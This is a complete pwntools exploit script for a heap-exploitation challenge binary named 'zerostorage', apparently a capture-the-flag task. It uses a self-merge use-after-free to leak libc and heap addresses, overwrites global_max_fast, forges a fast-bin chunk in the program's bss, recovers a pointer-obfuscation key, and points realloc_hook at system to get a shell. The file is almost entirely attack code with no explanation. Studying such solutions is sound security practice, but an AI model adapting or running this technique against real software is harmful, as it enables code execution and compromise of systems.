#!/usr/bin/env python
# coding: utf-8

from pwn import *

p = process('./zerostorage')

def insert(length, data=''):
    data = data.ljust(length, 'A')
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.sendline(str(length))
    p.send(data)

def update(idx, length, data=''):
    data = data.ljust(length, 'B')
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(length))
    p.send(data)

def merge(fro, to):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.sendline(str(fro))
    p.sendline(str(to))

def delete(idx):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.sendline(str(idx))

libc_max_fast = 0x7ffff7dd8860
libc_unsorted_bin = 0x7ffff7dd6678
libc_reallochook = 0x7ffff7dd6608
libc_system = 0x7ffff7a76560
zero_entry_head = 0x555555757060
unsorted_bin_offset = 0x3a1678
module_offset = 0x5ca000
head_offset = 0x203060

insert(8)                   # 0
insert(8, '/bin/sh;')       # 0, 1
insert(8)                   # 0, 1, 2
insert(8)                   # 0, 1, 2, 3
insert(8)                   # 0, 1, 2, 3, 4
insert(0x90)                # 0, 1, 2, 3, 4, 5
delete(0)                   # 1, 2, 3, 4, 5
merge(2,2)                  # 0, 1, 3, 4, 5

p.sendline('5')
p.sendline('0')
p.recvuntil('Entry No.0:\n')
heap = u64(p.recv(8))
unsorted_bin = u64(p.recv(8))
print '[+] unsorted bin @ %#x' % unsorted_bin
print '[+] heap @ %#x' % heap
libc = unsorted_bin - libc_unsorted_bin
max_fast = libc + libc_max_fast
system = libc + libc_system
reallochook = libc + libc_reallochook
entry_head = unsorted_bin - unsorted_bin_offset + module_offset + head_offset
print '[+] system @ %#x' % system
print '[+] reallochook @ %#x' % reallochook
print '[+] global_max_fast @ %#x' % max_fast
print '[+] program\'s entry head @ %#x' % entry_head

insert(8)      # 0, 1, 2, 3, 4, 5

# overwrite global_max_fast
update(0, 16, 'C'*8 + p64(max_fast - 0x10))
insert(8)      # 0, 1, 2, 3, 4, 5, 6

# free, put into "fast bin"
merge(3,3)     # 0, 1, 2, 4, 5, 6, 7
# overwrite fd to bss
update(7, 16, p64(entry_head + 24 * 5))

# get the fake chunk
insert(8)      # 0, 1, 2, 3, 4, 5, 6, 7

# get chunk again, pivot into bss
# no.8 will point to no.5's data, we should overlap into no.8 itself to get the key
insert(80)     # 0, 1, 2, 3, 4, 5, 6, 7, 8

# leak the key
p.sendline('5')
p.sendline('8')
p.recvuntil('Entry No.8:\n')
chunk8 = p.recv(80)
key = u64(chunk8[-8:]) ^ (entry_head + 24 * 5 + 16)
print '[+] Got key: %#x' % key

# overwrite no.6 to realloc_hook
update(8, 80, p64(0) + p64(1) + p64(8) + p64(reallochook ^ key))

# edit no.6
update(6, 8, p64(system))

# realloc no.1, get shell
update(1, 130)

p.sendline('')
p.interactive()

